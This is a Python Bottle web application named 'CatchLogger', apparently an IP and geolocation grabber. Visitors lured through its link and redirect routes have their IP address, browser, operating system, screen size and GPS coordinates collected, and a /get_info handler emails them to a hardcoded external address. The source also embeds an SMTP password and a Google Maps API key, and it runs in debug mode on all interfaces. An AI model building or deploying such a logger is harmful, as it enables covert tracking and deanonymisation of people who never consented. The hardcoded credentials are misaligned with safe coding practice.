# This Python file uses the following encoding: utf-8

import os
import sqlite3
import smtplib
import json
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from bottle import *
from socket import gethostname, gethostbyname 

def page_file(root, filename):
    return static_file(filename, root=root)

def html(filename):
	filename += ".html"
	return static_file(filename, root="./html/")

def send_email(text): 
    fromaddr = "noreply.intschool@gmail.com"
    toaddr = "andtun@yandex.ru"
    msg = MIMEMultipart('alternative')
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "CatchLogger results"
     
    body = text
    msg.attach(MIMEText(body, 'html'))
     
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "adminpsw")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()


@get("/")
def man():
    return html("index")

@get("/browser.js")
def rtrn():
    return static_file('browser.js', root='./js/')

@get("/get_info")
def obr():
    ip = (request.environ.get('HTTP_X_FORWARDED_FOR') or request.environ.get('REMOTE_ADDR'))
    print(ip)
    d = {}
    info = list("browser, language, OS, navbrser, navos, h, w, location_info".split(", "))
    for i in info:
         d[i] = request.query[i]
         print("i: "+i+"  --  "+d[i])
    coords = list(d['location_info'].split("|"))
    try:
    	d['lat'] = coords[0]
    	d['long'] = coords[1]
    	d['rad'] = coords[2]
    except TypeError:
    	d['lat'] = 'undefined'
    	d['long'] = 'undefined'
    	d['rad'] = "Okay"
    
    text = """<!DOCTYPE html>
<html><head><style>html{overflow-y:scroll}body{width:910px;margin:20px auto 10px;padding:0 10px;font:13px/1.231 sans-serif;background:#EEE;color:#444;line-height:1.4em;font-size:1em}h2{border-bottom:1px solid #ccc;font-size:1.2em;font-weight:700;margin:7px 0 15px}h3{margin:16px 0 10px 0}div#c{background:#FFF;border:1px solid #ccc;-moz-border-radius:0 0 8px 8px;border-radius:0 0 8px 8px;width:830px;border-width:1px;padding:8px 40px}.b{font-weight:700}.h{height:59px;width:812px;background-color:#828282;-moz-border-radius:8px 8px 0 0;border-radius:8px 8px 0 0;text-align:center;position:relative;padding:0 50px}.h h1{color:#f2f2f2;font-size:1.5em;line-height:1.1em;margin-top:1px;padding:4px}.h h1 a{color:#EEE;outline:0;text-decoration:none}.h h1 a:hover{color:#e6e6e6}.f{color:#999;padding-top:9px;font-size:.8em;text-align:center;width:900px;margin-left:auto;margin-right:auto}.f a{cursor:pointer}a{color:#797979;outline:0;text-decoration:none}a:hover{text-decoration:underline}td,th{vertical-align:middle;line-height:23px}th{text-align:right;font-weight:400;color:#777;white-space:nowrap;width:135px}td{padding:0 2px 0 5px;font-weight:700;font-size:16px;color:#737373}#b{width:205px;top:-2px;height:27px;font-size:14px;font-weight:700;margin-left:17px;float:left;margin-top:2px}#r{background-repeat:no-repeat;background-position:right top;width:830px}#r span{background:#fff;background:rgba(255,255,255,.7)}input:hover{-moz-box-shadow:0 0 3px #999;-webkit-box-shadow:0 0 3px #999;box-shadow:0 0 3px #999;border-color:#7d7d7d;background-color:#f5f5f5}input{-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-moz-background-clip:padding;-webkit-background-clip:padding-box;border:1px solid #aaa;white-space:nowrap;position:relative;color:#444;text-decoration:none;font-size:12px;margin-left:8px;width:98%;height:23px;line-height:23px;padding-left:5px;-webkit-transition:background-color .5s;-moz-transition:background-color .5s;-o-transition:background-color .5s;transition:background-color .5s;vertical-align:bottom;background:#fff}input::-moz-focus-inner{border:0;padding:0}fieldset{margin:0 2px 15px 2px;padding:2px 8px 8px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-moz-background-clip:padding;-webkit-background-clip:padding-box;border:1px solid #aaa;background:#fbfbfb}fieldset div{height:29px;width:578px;float:left}legend label{font-size:16px;line-height:normal;border:0 none;padding:0}.mobile{background:transparent url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAAQCAYAAADAvYV+AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAGtJREFUeNpi/P//P0Nubu5mBgJg8uTJvow5OTkgha1AfAKPWgsgrmaBckAK8ZnuCyKYGEgAo4qRAQt6WBJtMisr62ZsNIbJwLhHNh2dBqUfVJOLioo2Y6NhAJaQwKZATccAsFTJSEoSBQgwAKTWJmjZzTsEAAAAAElFTkSuQmCC) no-repeat center left;padding-left:16px}.proxy{background:transparent url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEwAACxMBAJqcGAAAAPVJREFUOI210L0uRFEUBeBvhoJCRsYkSolaMxKi0Ei8g0Yk5g1oNBJaQkMIk6lVnkAUEo2CzhtI/CSIyrSK2ZKT67rmFlayk33WWWvtczb/iElcR038JqoUBFzhIjQLWCwzfRm3qEbdYalfcw2PmE24OTxgpJ+AA7Sjb2E1+g72/zI38YKxOG9HQSPuplJDNekrOMYm3nLCX7EVmtyAVoR0Cl7YxjBWshd1PGM6w6c7+MaM3pJrKXmCo4LJWZziME18wmiOcA87OXxdb6HNAZxjFzc5wkaE32f4Lj6wUcEn5vFe4gswjstBrOMMQyUDulgr6fmJL8y4KWxQQ0kTAAAAAElFTkSuQmCC) no-repeat center left;padding-left:20px}</style></head><body><div class="h"><h1><a href="http://ip-api.com/#">CatchLogger<br><span id="t">Почувствуй себя хуцкером</span></a></h1></div><div id="c"><h2 id="e">Log result</h2><div id="r" style="opacity: 1; background-image: url(&quot;http://maps.googleapis.com/maps/api/staticmap?key=AIzaSyAjh0Pdk6dasNa6f58zkd86cOrtNxbHQHE&amp;center=54.9008,38.0708&amp;zoom=7&amp;format=jpg&amp;size=320x349&amp;language=en&amp;path=color:0x3af1ad30|weight:116|54.9008,38.0708|54.9008,38.07081&quot;);"><table><tbody id="o"><tr><th>Browser:</th><td><span id="qr"><a href="#">%s</a></span></td></tr><tr><th>Language:</th><td><span>%s</span></td></tr><tr><th>OS:</th><td><span>%s</span></td></tr><tr><th>Browser (navi):</th><td><span>%s</span></td></tr><tr><th>OS (navi):</th><td><span>%s</span></td></tr><tr><th>Window height:</th><td><span>%s</span></td></tr><tr><th>Window width:</th><td><span>%s</span></td></tr><tr><th>Latitude:</th><td><span>%s</span></td></tr><tr><th>Longitude:</th><td><span>%s</span></td></tr><tr><th>Radius:</th><td><span>%s</span></td></tr><tr><th>IP:</th><td><span>%s</span></td></tr></tbody></table></div><div class="f"><div id="loDiv">© CatchLogger by Andrey A Tyunyatkin </div></div></div></body></html>""" % (d['browser'], d['language'], d['OS'], d['navbrser'], d['navos'], d['h'], d['w'], d['lat'], d['long'], d['rad'], ip)
    send_email(text)
    

@get("/login")
def login():
	return html("login")

@get("/spasibi")
def faq():
    return html("spasibi")

# test logger
@get("/catch")
def chk():
    return html("catch")
#---------------

@get("/link/<whereto>")
def redir(whereto):
    whereto = "http://"+whereto
    ip = gethostbyname(gethostname())
    redirect(whereto)
    
        
# =========================FOR BEAUTY==========================

@route("/<root>/<filename>")
def f(root, filename):
    return page_file(root, filename)

@route("/css/font-awesome/css/font-awesome.min.css")
def font():
    return static_file("font-awesome.min.css", root="./css/font-awesome/css/")

@route("/images/logo.png")
def logo():
    return static_file("Logo.png", root='./images/')

@error(404)
def fff(error):
    return html("404")

@error(500)
def fff(error):
    return html("500")
# -------------------------------------------------------------
    
run(host="0.0.0.0", port=os.environ.get('PORT', 5000), debug=True)
